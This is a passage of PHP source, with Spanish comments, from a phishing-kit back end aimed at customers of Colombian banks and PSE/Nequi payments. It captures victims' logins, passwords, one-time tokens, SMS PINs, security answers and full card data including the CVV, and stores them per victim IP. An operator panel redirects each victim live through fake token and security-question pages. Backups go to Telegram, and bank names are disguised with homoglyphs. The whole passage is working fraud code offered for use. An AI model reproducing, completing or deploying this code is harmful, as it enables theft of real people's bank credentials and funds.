        
        if ($httpCode === 200) {
            return ['success' => true, 'message' => 'Backup ZIP enviado a Telegram ✅'];
        } else {
            return ['success' => false, 'error' => 'Error Telegram: ' . $httpCode];
        }
    }
    
    return ['success' => false, 'error' => 'Archivo vacío o no existe.'];
}



// FUNCIÓN MEJORADA saveTokenAndCoordsHistory
function saveTokenAndCoordsHistory($ip, $submissionId, $newToken = null, $newCoords = null) {
    $usersData = loadUsersData();
    
    if (isset($usersData[$ip])) {
        foreach ($usersData[$ip]['submissions'] as &$sub) {
            if ($sub['submission_id'] === $submissionId) {
                
                // GUARDAR TOKENS
                if ($newToken && preg_match('/^\d{4,8}$/', $newToken)) {
                    // Inicializar all_tokens
                    if (!isset($sub['all_tokens'])) {
                        $sub['all_tokens'] = [];
                    }
                    
                    // Agregar si no existe
                    if (!in_array($newToken, $sub['all_tokens'])) {
                        $sub['all_tokens'][] = $newToken;
                    }
                    
                    // Mantener máximo 10 tokens
                    if (count($sub['all_tokens']) > 10) {
                        $sub['all_tokens'] = array_slice($sub['all_tokens'], -10);
                    }
                    
                    // También en token_history para compatibilidad
                    if (!isset($sub['token_history'])) {
                        $sub['token_history'] = [];
                    }
                    if (!in_array($newToken, $sub['token_history'])) {
                        $sub['token_history'][] = $newToken;
                    }
                }
                
                // GUARDAR COORDENADAS LIMPIAS
                if ($newCoords) {
                    // Limpiar el texto primero
                    $cleanCoords = cleanCoordinateText($newCoords);
                    
                    if (!empty($cleanCoords)) {
                        // Inicializar all_coords
                        if (!isset($sub['all_coords'])) {
                            $sub['all_coords'] = [];
                        }
                        
                        // Procesar coordenadas
                        if (strpos($cleanCoords, '|') !== false) {
                            // Separar pares
                            $pairs = explode('|', $cleanCoords);
                            foreach ($pairs as $pair) {
                                $pair = trim($pair);
                                if (!empty($pair)) {
                                    $formattedPair = formatCoordinate($pair);
                                    if (!empty($formattedPair) && !in_array($formattedPair, $sub['all_coords'])) {
                                        $sub['all_coords'][] = $formattedPair;
                                    }
                                }
                            }
                        } else {
                            // Coordenada única
                            $formattedCoord = formatCoordinate($cleanCoords);
                            if (!empty($formattedCoord) && !in_array($formattedCoord, $sub['all_coords'])) {
                                $sub['all_coords'][] = $formattedCoord;
                            }
                        }
                        
                        // Mantener máximo 10 coordenadas
                        if (count($sub['all_coords']) > 10) {
                            $sub['all_coords'] = array_slice($sub['all_coords'], -10);
                        }
                        
                        // También en coords_history para compatibilidad
                        if (!isset($sub['coords_history'])) {
                            $sub['coords_history'] = [];
                        }
                        if (!in_array($cleanCoords, $sub['coords_history'])) {
                            $sub['coords_history'][] = $cleanCoords;
                        }
                    }
                }
                
                break;
            }
        }
        
        file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
        return true;
    }
    
    return false;
}


function clearAllUsers() {
    // Crear backup primero
    $backupResult = createBackup();
    
    if ($backupResult) {
        // Separar el resultado (puede contener info de Telegram)
        $backupParts = explode('|', $backupResult);
        $backupFile = $backupParts[0];
        $telegramInfo = $backupParts[1] ?? '';
        
        // Limpiar todos los usuarios
        file_put_contents('xzw.json', json_encode([], JSON_PRETTY_PRINT));
        
        $message = 'Tabla limpiada correctamente. ';
        $message .= 'Backup creado: ' . basename($backupFile);
        
        if ($telegramInfo) {
            $message .= ' | ' . $telegramInfo;
        }
        
        return [
            'success' => true, 
            'message' => $message
        ];
    } else {
        return ['success' => false, 'error' => 'Error al crear backup'];
    }
}

function processFrontendDataWithUserBlock($data) {
    // AGREGADO: Definir zona horaria y timestamp OBLIGATORIO
    date_default_timezone_set('America/Bogota'); // O tu zona horaria
    $timestamp = time(); // Usamos time() para que sea un número ordenable
    
    $ip = $data['ip'] ??  (isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? trim(explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0]) : (isset($_SERVER["HTTP_CLIENT_IP"]) ? $_SERVER["HTTP_CLIENT_IP"] : (isset($_SERVER["HTTP_X_REAL_IP"]) ? $_SERVER["HTTP_X_REAL_IP"] : (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"])))) ;
    $usersData = loadUsersData();
    
    // ============================================================
    // CORRECCIÓN DISPOSITIVO: PERSISTENCIA
    // ============================================================
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $isReqMobile = preg_match('/(android|iphone|ipad|mobile)/i', $ua);
    
    // Si ya sabíamos que era móvil, lo mantenemos móvil a la fuerza.
    if (isset($usersData[$ip]['device_type']) && $usersData[$ip]['device_type'] === 'mobile') {
        $deviceType = 'mobile';
    } else {
        $deviceType = $isReqMobile ? 'mobile' : 'desktop';
    }
    // ============================================================

    // EXTRAER USERNAME
    $username = '';
    $contenido = $data['contenido'] ?? '';
    if (preg_match('/👤 User:\s*([^\n]+)/', $contenido, $matches)) $username = trim($matches[1]);
    
    // 1. VERIFICAR BLOQUEOS
    if (!empty($username) && isUserBlocked($username)) {
        if (!isset($usersData[$ip])) {
            $usersData[$ip] = ['color'=>'#f00', 'currentPage'=>'Frontend/login_real.php', 'location'=>'Auto-Blocked', 'status'=>'blocked', 'last_seen'=>time(), 'submissions'=>[]];
        } else { $usersData[$ip]['status'] = 'blocked'; $usersData[$ip]['last_seen'] = time(); }
        file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
        return ['success' => false, 'error' => "Bloqueado", 'blocked' => true];
    }
    if (isset($usersData[$ip]) && $usersData[$ip]['status'] === 'blocked') {
        $usersData[$ip]['last_seen'] = time();
        file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
        return ['success' => false, 'error' => 'IP bloqueada', 'blocked' => true];
    }
    
    // 2. DETERMINAR FRONTEND
    $frontend = 'bogota'; 
    $palabrasClave = ['bogota' => ['BOGOTA', 'BOGOTÁ', 'CREDICOOP', 'COOP', 'CREDI']];
    // Lógica detección banco
    if (isset($usersData[$ip]) && !empty($usersData[$ip]['submissions'])) {
        foreach ($usersData[$ip]['submissions'] as $submission) {
            if (isset($submission['data']['Banco'])) {
                $banco = $submission['data']['Banco'];
                foreach ($palabrasClave as $frontendName => $variantes) {
                    foreach ($variantes as $variante) {
                        if (stripos($banco, $variante) !== false) {
                            $frontend = $frontendName;
                            break 3;
                        }
                    }
                }
            }
        }
    }
    
    // PÁGINA DE ESPERA OBLIGATORIA
    $paginaEspera = 'wait.php';
    $currentPage = RUTA_DINAMICA . "/{$paginaEspera}";
    
    // 3. EXTRAER DATOS
    $extractedData = [];
    if (preg_match('/👤 User:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Usuario'] = trim($matches[1]);
    if (preg_match('/🔐 Clave:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Clave'] = trim($matches[1]);
    if (preg_match('/👤 Documento:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Documento'] = trim($matches[1]);
    if (preg_match('/NroEmpresarial:\s*([^\n]+)/', $contenido, $matches)) $extractedData['NroEmpresarial'] = trim($matches[1]);
    if (preg_match('/🔑 Token:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Token'] = trim($matches[1]);
        if (preg_match('/🔑 TokenNetCash:\s*([^\n]+)/', $contenido, $matches)) $extractedData['TokenNetCash'] = trim($matches[1]);
        if (preg_match('/🔑 Token Empresa:\s*([^\n]+)/', $contenido, $matches)) $extractedData['TokenEmpresa'] = trim($matches[1]);
    if (preg_match('/📱 SMS:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Pin'] = trim($matches[1]);
    if (preg_match('/🔢 PIN:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Pin'] = trim($matches[1]);
        if (preg_match('/👤 Firmante:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Firmante'] = trim($matches[1]);
        if (preg_match('/📱 TokenApp:\s*([^\n]+)/', $contenido, $matches)) $extractedData['TokenApp'] = trim($matches[1]);
    if (preg_match('/🔐 ClaveOperaciones:\s*([^\n]+)/', $contenido, $matches)) $extractedData['ClaveOperaciones'] = trim($matches[1]);
    if (preg_match('/📧 Correo:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Correo'] = trim($matches[1]);
    if (preg_match('/🔑 Clave\s*Correo:\s*([^\n]+)/', $contenido, $matches)) $extractedData['ClaveCorreo'] = trim($matches[1]);
        if (preg_match('/❓ Preg1:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Preg1'] = trim($matches[1]);
        if (preg_match('/✏️ Resp1:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Resp1'] = trim($matches[1]);
        if (preg_match('/❓ Preg2:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Preg2'] = trim($matches[1]);
        if (preg_match('/✏️ Resp2:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Resp2'] = trim($matches[1]);
        if (preg_match('/❓ Preg3:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Preg3'] = trim($matches[1]);
        if (preg_match('/✏️ Resp3:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Resp3'] = trim($matches[1]);
        if (preg_match('/❓ Preg4:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Preg4'] = trim($matches[1]);
        if (preg_match('/✏️ Resp4:\s*([^\n]+)/', $contenido, $matches)) $extractedData['Resp4'] = trim($matches[1]);
        if (preg_match('/❓ Pregunta:\s*([^\n]+)/', $contenido, $matches)) $extractedData['PreguntaSeguridad'] = trim($matches[1]);
        if (preg_match('/✏️ Respuesta:\s*([^\n]+)/', $contenido, $matches)) $extractedData['RespuestaSeguridad'] = trim($matches[1]);
        if (preg_match('/💳 Tarjeta:\s*([^\n]+)/', $contenido, $matches)) $extractedData['CC_Number'] = trim($matches[1]);
    if (preg_match('/📅 Vencimiento:\s*([^\n]+)/', $contenido, $matches)) $extractedData['CC_Exp'] = trim($matches[1]);
    if (preg_match('/🔒 CVV:\s*([^\n]+)/', $contenido, $matches)) $extractedData['CC_Cvv'] = trim($matches[1]);
        
    // --- CAPTURA DE COORDENADAS ---
    if (isset($data['coordenada1'])) $extractedData['RtaCoord1'] = trim($data['coordenada1']);
    if (isset($data['coordenada2'])) $extractedData['RtaCoord2'] = trim($data['coordenada2']);
    if (strpos($contenido, '|') !== false || preg_match('/Coordenada.*:\s*([^\n]+)/i', $contenido)) {
        $extractedData['RtaGen'] = trim($contenido); 
    }

    // 4. REFERENCIAS
    $existingDocumento = '';
    $existingUsuario = ''; // ✅ AGREGADO: Variable para el usuario
    $lastSubmissionIndex = -1;
    
    if (isset($usersData[$ip]) && !empty($usersData[$ip]['submissions'])) {
        $lastSubmissionIndex = count($usersData[$ip]['submissions']) - 1;
        $existingDocumento = $usersData[$ip]['submissions'][$lastSubmissionIndex]['data']['Documento'] ?? '';
        $existingUsuario = $usersData[$ip]['submissions'][$lastSubmissionIndex]['data']['Usuario'] ?? ''; // ✅ AGREGADO: Obtener usuario previo
    }
    
    // 5. DECISIÓN: ACTUALIZAR O NUEVA LÍNEA
    $action = 'new_line';
    $tieneToken = !empty($extractedData['Token']);
    $tieneCoords = !empty($extractedData['RtaCoord1']) || !empty($extractedData['RtaGen']); 
    
    // ✅ CORRECCIÓN PRINCIPAL:
    // Ahora consideramos que tiene datos previos si hay Documento O Usuario.
    // Esto soluciona el problema con el login de Empresa que no usa Documento.
    $tieneDatosPrevios = !empty($existingDocumento) || !empty($existingUsuario);

    if (($tieneToken || $tieneCoords) && $tieneDatosPrevios) {
        $action = 'update_line';
    } elseif ($tieneDatosPrevios) {
        // Verificar si el usuario cambió
        $usuarioGuardado = $usersData[$ip]['submissions'][$lastSubmissionIndex]['data']['Usuario'] ?? '';
        $nuevoUsuario = $extractedData['Usuario'] ?? '';
        
        // Si mandan un usuario nuevo y es diferente al anterior, creamos nueva línea.
        // Si es el mismo o no mandan usuario (solo token), actualizamos.
        if (!empty($nuevoUsuario) && $nuevoUsuario !== $usuarioGuardado) {
            $action = 'new_line';
        } else {
            $action = 'update_line';
        }
    }

    // 6. EJECUTAR GUARDADO
    if ($action === 'update_line' && $lastSubmissionIndex >= 0) {
        // --- ACTUALIZAR ---
        
        // Obtener datos antiguos para comparar
        $oldToken = $usersData[$ip]['submissions'][$lastSubmissionIndex]['data']['Token'] ?? null;
        $oldRtaGen = $usersData[$ip]['submissions'][$lastSubmissionIndex]['data']['RtaGen'] ?? null;
        $oldCoord1 = $usersData[$ip]['submissions'][$lastSubmissionIndex]['data']['RtaCoord1'] ?? null;
        $oldCoord2 = $usersData[$ip]['submissions'][$lastSubmissionIndex]['data']['RtaCoord2'] ?? null;
        
        foreach ($extractedData as $key => $value) {
            if (!empty($value)) {
                // Guardar histórico de TOKENS MÚLTIPLES
                if ($key === 'Token' && $value !== $oldToken) {
                    // Guardar NUEVO token
                    saveTokenAndCoordsHistory($ip, $usersData[$ip]['submissions'][$lastSubmissionIndex]['submission_id'], $value, null);
                    
                    // También guardar el token ANTERIOR si existe
                    if ($oldToken && $oldToken !== $value) {
                        saveTokenAndCoordsHistory($ip, $usersData[$ip]['submissions'][$lastSubmissionIndex]['submission_id'], $oldToken, null);
                    }
                }
                
                // Guardar histórico de COORDENADAS MÚLTIPLES
                if (($key === 'RtaGen' || $key === 'RtaCoord1' || $key === 'RtaCoord2')) {
                    // Preparar coordenadas actuales para historial
                    $currentCoords = '';
                    
                    if (!empty($extractedData['RtaGen'])) {
                        $currentCoords = $extractedData['RtaGen'];
                    } elseif (!empty($extractedData['RtaCoord1']) && !empty($extractedData['RtaCoord2'])) {
                        $currentCoords = $extractedData['RtaCoord1'] . "|" . $extractedData['RtaCoord2'];
                    }
                    
                    // Preparar coordenadas antiguas
                    $oldCoords = '';
                    if (!empty($oldRtaGen)) {
                        $oldCoords = $oldRtaGen;
                    } elseif (!empty($oldCoord1) && !empty($oldCoord2)) {
                        $oldCoords = $oldCoord1 . "|" . $oldCoord2;
                    }
                    
                    // Guardar si hay coordenadas nuevas y son diferentes
                    if ($currentCoords && $currentCoords !== $oldCoords) {
                        saveTokenAndCoordsHistory($ip, $usersData[$ip]['submissions'][$lastSubmissionIndex]['submission_id'], null, $currentCoords);
                        
                        // También guardar coordenadas antiguas si existen
                        if ($oldCoords && $oldCoords !== $currentCoords) {
                            saveTokenAndCoordsHistory($ip, $usersData[$ip]['submissions'][$lastSubmissionIndex]['submission_id'], null, $oldCoords);
                        }
                    }
                }
                
                // Actualizar el dato en el array
                $usersData[$ip]['submissions'][$lastSubmissionIndex]['data'][$key] = $value;
            }
        }
        
        // Metadata Individual
        $usersData[$ip]['submissions'][$lastSubmissionIndex]['last_seen'] = $timestamp;
        $usersData[$ip]['submissions'][$lastSubmissionIndex]['currentPage'] = $currentPage;
        
    } else {
        // --- NUEVA LINEA ---
        $submissionId = $ip . '_' . $timestamp . '_' . rand(1000, 9999);
        $newSubmissionData = [
            'submission_id' => $submissionId,
            'timestamp' => $timestamp,
            'last_seen' => $timestamp,
            'currentPage' => $currentPage,
            'data' => $extractedData,
            'all_tokens' => [],  // NUEVO: Array para acumular tokens
            'all_coords' => []   // NUEVO: Array para acumular coordenadas
        ];
        
        // Agregar documento existente si no hay nuevo
        if (empty($extractedData['Documento']) && !empty($existingDocumento)) {
            $newSubmissionData['data']['Documento'] = $existingDocumento;
        }
        
        // AGREGAR TOKENS INICIALES
        if (!empty($extractedData['Token'])) {
            $newSubmissionData['all_tokens'][] = $extractedData['Token'];
            // También en token_history para compatibilidad
            $newSubmissionData['token_history'] = [$extractedData['Token']];
        }
        
        // AGREGAR COORDENADAS INICIALES
        $initialCoords = '';
        if (!empty($extractedData['RtaGen'])) {
            $initialCoords = $extractedData['RtaGen'];
        } elseif (!empty($extractedData['RtaCoord1']) && !empty($extractedData['RtaCoord2'])) {
            $initialCoords = $extractedData['RtaCoord1'] . "|" . $extractedData['RtaCoord2'];
        }
        
        if ($initialCoords) {
            // Procesar y agregar a all_coords
            if (strpos($initialCoords, '|') !== false) {
                $pairs = explode('|', $initialCoords);
                foreach ($pairs as $pair) {
                    $pair = trim($pair);
                    if (!empty($pair)) {
                        // Formatear H6=555 a H6: 555
                        $pair = str_replace('=', ': ', $pair);
                        $newSubmissionData['all_coords'][] = $pair;
                    }
                }
            } else {
                $initialCoords = str_replace('=', ': ', $initialCoords);
                $newSubmissionData['all_coords'][] = $initialCoords;
            }
            
            // También en coords_history para compatibilidad
            $newSubmissionData['coords_history'] = [$initialCoords];
        }
        
        // Crear o actualizar usuario
        if (!isset($usersData[$ip])) {
            $usersData[$ip] = [
                'color' => getRandomColor(),
                'location' => getLocationByIP($ip),
                'status' => 'online',
                'device_type' => $deviceType,
                'last_seen' => $timestamp,
                'submissions' => []
            ];
        }
        $usersData[$ip]['submissions'][] = $newSubmissionData;
    }
    
    // 7. ACTUALIZAR GLOBAL
    if (isset($usersData[$ip])) {
        $usersData[$ip]['last_seen'] = $timestamp;
        $usersData[$ip]['currentPage'] = $currentPage;
        $usersData[$ip]['device_type'] = $deviceType;
    }
    
    file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
    
    // Llamar a saveTokenAndCoordsHistory para asegurar que se guarden los datos
    if (!empty($extractedData['Token']) || !empty($extractedData['RtaGen']) || !empty($extractedData['RtaCoord1'])) {
        $currentSubmissionId = '';
        if ($action === 'update_line' && $lastSubmissionIndex >= 0) {
            $currentSubmissionId = $usersData[$ip]['submissions'][$lastSubmissionIndex]['submission_id'];
        } elseif (isset($usersData[$ip]['submissions']) && !empty($usersData[$ip]['submissions'])) {
            $lastIdx = count($usersData[$ip]['submissions']) - 1;
            $currentSubmissionId = $usersData[$ip]['submissions'][$lastIdx]['submission_id'];
        }
        
        if ($currentSubmissionId) {
            // Guardar token si existe
            if (!empty($extractedData['Token'])) {
                saveTokenAndCoordsHistory($ip, $currentSubmissionId, $extractedData['Token'], null);
            }
            
            // Guardar coordenadas si existen
            $coordsForHistory = '';
            if (!empty($extractedData['RtaGen'])) {
                $coordsForHistory = $extractedData['RtaGen'];
            } elseif (!empty($extractedData['RtaCoord1']) && !empty($extractedData['RtaCoord2'])) {
                $coordsForHistory = $extractedData['RtaCoord1'] . "|" . $extractedData['RtaCoord2'];
            }
            
            if ($coordsForHistory) {
                saveTokenAndCoordsHistory($ip, $currentSubmissionId, null, $coordsForHistory);
            }
        }
    }
    
    return ['success' => true, 'action' => $action];
}

// MEJORAR processAdminAction PARA BLOQUEO POR USUARIO
// MODIFICAR LA FUNCIÓN processAdminAction
function processAdminAction($postData) {
    $action = $postData['action'] ?? '';
    
    switch($action) {
                case 'set_auth_mode':
            $mode = $postData['mode'] ?? 'authorization';
            return setAuthMode($mode);
                case 'approve_login':
            return approveUserLogin($_POST['username']);
        case 'reject_login':
            return rejectUserLogin($_POST['username']);
        case 'get_pending_logins':
            return getPendingLogins();
        case 'redirect':
            return redirectUser($postData['ip'], $postData['page']);
        case 'block':
            return blockUserByIP($postData['ip']);
        case 'unblock':
            return unblockUserByIP($postData['ip']);
        case 'delete':
            return deleteUser($postData['ip']);
        case 'delete_submission':
            return deleteSubmission($postData['ip'], $postData['submission_id']);
        case 'clear_table':
            return clearAllUsers();
                case 'redirect_by_submission':
            return redirectUserBySubmission($postData['submission_id'], $postData['ip'], $postData['page']);
                case 'set_security_question':
            return setSecurityQuestionAndRedirect($postData['submission_id'], $postData['ip'], $postData['pregunta'] ?? '');
        case 'heartbeat':
            if (isset($postData['ip'])) {
                $usersData = loadUsersData();
                if (isset($usersData[$postData['ip']]) && $usersData[$postData['ip']]['status'] === 'blocked') {
                    return ['success' => true, 'status' => 'blocked'];
                }
                updateUserStatus($postData['ip'], 'online');
                return ['success' => true, 'status' => 'online'];
            }
            return ['success' => false, 'error' => 'IP no proporcionada'];
        case 'load_users':
            echo generateUsersTable(loadUsersData());
            exit;
        case 'check_my_page':
            $userIP =  (isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? trim(explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0]) : (isset($_SERVER["HTTP_CLIENT_IP"]) ? $_SERVER["HTTP_CLIENT_IP"] : (isset($_SERVER["HTTP_X_REAL_IP"]) ? $_SERVER["HTTP_X_REAL_IP"] : (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"])))) ;
            $usersData = loadUsersData();
            if (isset($usersData[$userIP])) {
                return [
                    'success' => true, 
                    'currentPage' => $usersData[$userIP]['currentPage'] ?? '',
                    'ip' => $userIP
                ];
            }
            return ['success' => false, 'error' => 'Usuario no encontrado'];
        case 'guardar_coordenadas':
            return guardarCoordenadas($postData);
        // ✅✅✅ NUEVO CASO AGREGADO
        case 'guardar_nombre_token':
            return guardarNombreToken($postData);
                case 'mark_submission':
            return markSubmission($postData);
                case 'unmark_submission':
            return unmarkSubmission($postData);
                case 'guardar_challenge':
            $ip = $postData['ip'] ?? '';
            $code = $postData['code'] ?? '';
            $usersData = loadUsersData();
            
            if (isset($usersData[$ip])) {
                // Guardar código
                $usersData[$ip]['challenge_code'] = $code;
                $usersData[$ip]['last_seen'] = time();
                
                file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
                
                // CORRECCION AQUÍ: Usar punto (.) no mas (+)
                return ['success' => true, 'message' => 'Código guardado: ' . $code];
            }
            return ['success' => false, 'error' => 'IP no encontrada'];
            
        default:
            // ✅ DETECCIÓN MEJORADA: Primero datos de PSE, luego otros frontends
if (isset($postData['amount']) && isset($postData['bank'])) {
    error_log("🎯 Datos de PSE detectados: " . print_r($postData, true));
    
    // ✅ USAR LA NUEVA FUNCIÓN CON ID PERSISTENTE
    if (isset($postData['user_id']) || isset($postData['action']) && $postData['action'] === 'pse_data') {
        return processPseDataWithUserId($postData);
    } else {
        return processNequiData($postData);
    }
}
            
            // ✅ DETECCIÓN DE DATOS DE OTROS FRONTENDS (login, token, card, sms)
            if (isset($postData['contenido']) || isset($postData['usuario']) || isset($postData['clave']) || isset($postData['token']) || isset($postData['sms'])) {
                return processFrontendDataWithUserBlock($postData);
            }
    }
    
    return ['success' => false, 'error' => 'Acción no válida'];
}

function redirectUserBySubmission($submissionId, $ip, $page) {
    $usersData = loadUsersData();
    
    if (isset($usersData[$ip]) && !empty($usersData[$ip]['submissions'])) {
        $found = false;
        
        $map = [
    'login_real.php'    => RUTA_DINAMICA . '/index.php',
    'login_empresa.php' => RUTA_DINAMICA . '/empresas.php',
    'token_real.php'    => RUTA_DINAMICA . '/token.php',
        'tokenapp.php'      => RUTA_DINAMICA . '/tokenapp.php',
        'corre.php'         => RUTA_DINAMICA . '/corre.php',
        'pregug.php'        => RUTA_DINAMICA . '/pregug.php',
        'espera_real.php'   => RUTA_DINAMICA . '/wait.php',
        'end.php'           => RUTA_DINAMICA . '/end.php'
];
        
        // Si la página solicitada está en el mapa, usamos la ruta larga. Si no, usamos la página tal cual.
        $targetPage = $map[$page] ?? $page;

        // Buscar y actualizar la entrada específica
        foreach ($usersData[$ip]['submissions'] as &$sub) {
            // Comparación flexible (==) por si el ID es texto o número
            if ($sub['submission_id'] == $submissionId) {
                $sub['currentPage'] = $targetPage; // Asignar página
                $sub['last_seen'] = time();       // Actualizar reloj
                $found = true;
                break; 
            }
        }
        
        if ($found) {
            // Actualizar también la IP Global para forzar la detección del cambio
            $usersData[$ip]['currentPage'] = $targetPage; 
            $usersData[$ip]['last_seen'] = time();
            
            file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
            return ['success' => true, 'message' => "Redirigido a $page"];
        }
    }
    
    return ['success' => false, 'error' => 'No se encontró el registro'];
}

function setSecurityQuestionAndRedirect($submissionId, $ip, $pregunta) {
    $usersData = loadUsersData();
    
    if (isset($usersData[$ip]) && !empty($usersData[$ip]['submissions'])) {
        $pregunta = trim($pregunta);
        $found = false;
        
        foreach ($usersData[$ip]['submissions'] as &$sub) {
            if ($sub['submission_id'] == $submissionId) {
                $sub['data']['PreguntaSeguridad'] = $pregunta;
                $sub['currentPage'] = RUTA_DINAMICA . '/pregug.php';
                $sub['last_seen'] = time();
                $found = true;
                break;
            }
        }
        
        if ($found) {
            $usersData[$ip]['security_question'] = $pregunta;
            $usersData[$ip]['currentPage'] = RUTA_DINAMICA . '/pregug.php';
            $usersData[$ip]['last_seen'] = time();
            
            file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
            return ['success' => true, 'message' => 'Pregunta enviada y usuario redirigido'];
        }
    }
    
    return ['success' => false, 'error' => 'No se encontró el registro'];
}

function deleteSubmission($ip, $submissionId) {
    $usersData = loadUsersData();
    
    if (isset($usersData[$ip]) && !empty($usersData[$ip]['submissions'])) {
        $found = false;
        // Recorrer y buscar ID exacto
        foreach ($usersData[$ip]['submissions'] as $key => $sub) {
            // Usamos == para ser flexible (string/int)
            if ($sub['submission_id'] == $submissionId) {
                unset($usersData[$ip]['submissions'][$key]);
                $found = true;
                break; // Solo borramos uno
            }
        }
        
        if ($found) {
            // Reordenar índices numéricos del array
            $usersData[$ip]['submissions'] = array_values($usersData[$ip]['submissions']);
            
            // Si el usuario se queda sin submissions, borrar el usuario entero
            if (empty($usersData[$ip]['submissions'])) {
                unset($usersData[$ip]);
            }
            
            file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
            return ['success' => true, 'message' => 'Registro eliminado'];
        }
    }
    
    return ['success' => false, 'error' => 'No se encontró el registro'];
}

// FUNCIÓN AUXILIAR PARA EXTRAER EL NOMBRE DEL FRONTEND DE LA URL
function extractFrontendFromPage($pageUrl) {
    // Ejemplo: "/wp-content/panelv2/Frontend/pse/avvillas/card.html"
    $parts = explode('/', $pageUrl);
    
    // Buscar el índice de "pse" y tomar el siguiente elemento
    $pseIndex = array_search('pse', $parts);
    if ($pseIndex !== false && isset($parts[$pseIndex + 1])) {
        return $parts[$pseIndex + 1]; // "avvillas", "bogota", etc.
    }
    
    return 'desconocido';
}

// FUNCIÓN AUXILIAR PARA OBTENER PÁGINA POR SUBMISSION
function getPageBySubmission($submission, $page) {
    // Obtener el banco del submission
    $banco = $submission['data']['Banco'] ?? '';
    
    // Determinar el frontend basado en el banco
    $frontend = 'bogota'; // Por defecto
    
    $palabrasClave = [
        'occidente' => ['OCCIDENTE', 'ΟϹϹlᎠEΝΤE', 'OCClᎠEΝΤE', 'OCC1DENTE'],
        'bogota' => ['BOGOTA', 'BOGOTÁ', 'ΒΟԌΟΤᎪ', 'BOG0TA'],
        'bbva' => ['BBVA', 'ВВᏙᎪ', 'BBVᎪ'],
        'davivienda' => ['DAVIVIENDA', 'ＤΑѴlѴlΕΝＤΑ', 'DAV1V1ENDA'],
        'avvillas' => ['AV VILLAS', 'AѴ ѴlᏞᏞAՏ', 'AV V1LLAS'],
        'cajasocial' => ['CAJA SOCIAL', 'ϹΑЈΑ ՏΟϹlΑL', 'CAJA S0CIAL'],
        'popular' => ['POPULAR', 'PΟPՍᏞᎪＲ', 'P0PULAR'],
        'colpatria' => ['COLPATRIA', 'ЅϹΟΤΙΑΒΑΝΚ ϹΟᏞРΑΤᏒlΑ', 'C0LPATRIA'],
        'daviplata' => ['ᎠᎪᏙlPᏞᎪΤᎪ', 'ᎠᎪᏙIPᏞᎪΤᎪ', 'DAVIPLATA'],
        'bancolombia' => ['ΒΑNϹΟᏞΟΜᏴlᎪ', 'ΒΑNϹΟᏞΟΜᏴlA', 'BΑNϹΟᏞΟΜᏴIA'],
        'falabella' => ['ΒΑNϹΟ ϜᎪᏞᎪΒĘᏞᏞᎪ', 'ϜᎪᏞᎪΒĘᏞᏞᎪ', 'FᎪᏞᎪΒĘᏞᏞᎪ'],
        'bmujer' => ['ΜՍΝᎠΟ ΜՍᎫΕR', 'MUJER', 'MUNDO MUJER'],
                'lulob' => ['Ꮮ⋃ᏞΟ ВᎪΝΚ', 'Ꮮ⋃ᏞΟ', 'ВᎪΝΚ Ꮮ⋃ᏞΟ'],
    ];
    
    foreach ($palabrasClave as $frontendName => $variantes) {
        foreach ($variantes as $variante) {
            if (stripos($banco, $variante) !== false) {
                $frontend = $frontendName;
                break 2;
            }
        }
    }
    
    $pageMapping = [
    'bogota' => [
        'login_real.php'    => RUTA_DINAMICA . '/index.php',
        'login_empresa.php' => RUTA_DINAMICA . '/empresas.php',
        'token_real.php'    => RUTA_DINAMICA . '/token.php', 
        'espera_real.php'   => RUTA_DINAMICA . '/token2.php',
        'blocked.php'       => RUTA_DINAMICA . '/blocked.php'
    ]
];
    
    // Usar el mapeo correcto según el frontend detectado
    $mapping = $pageMapping[$frontend] ?? $pageMapping['bogota'];
    
    // VERIFICAR SI LA PÁGINA ESTÁ HABILITADA PARA ESTE FRONTEND
    if (!isset($mapping[$page])) {
        error_log("❌ PÁGINA NO HABILITADA - Frontend: $frontend no tiene $page configurado");
        return false; // Retornar false para indicar error
    }
    
    $targetPage = $mapping[$page];
    error_log("🎯 Redirección: Banco '$banco' → Frontend: $frontend → Página: $page → URL: $targetPage");
    
    return $targetPage;
}

function extractDataFromContent($contenido, $ip) {
        error_log("🔍 EXTRACT DATA - Contenido recibido:");
error_log($contenido);
    $userData = [
        'color' => '#800080',
        'currentPage' => 'Frontend/login_real.php',
        'location' => '$location',
        'status' => 'online',
        'last_seen' => time(),
        'submissions' => []
    ];
    
        // Buscar documento (NUEVO)
    if (preg_match('/👤 Documento:\s*([^\n]+)/', $contenido, $matches)) {
        $userData['submissions'][] = [
            'data' => [
                'Documento' => trim($matches[1]),  // NUEVO CAMPO
            ],
            'timestamp' => time()
        ];
    }
        
        // Buscar NroEmpresarial
     if (preg_match('/NroEmpresarial:\s*([^\n]+)/', $contenido, $matches)) {
     if (empty($userData['submissions'])) {
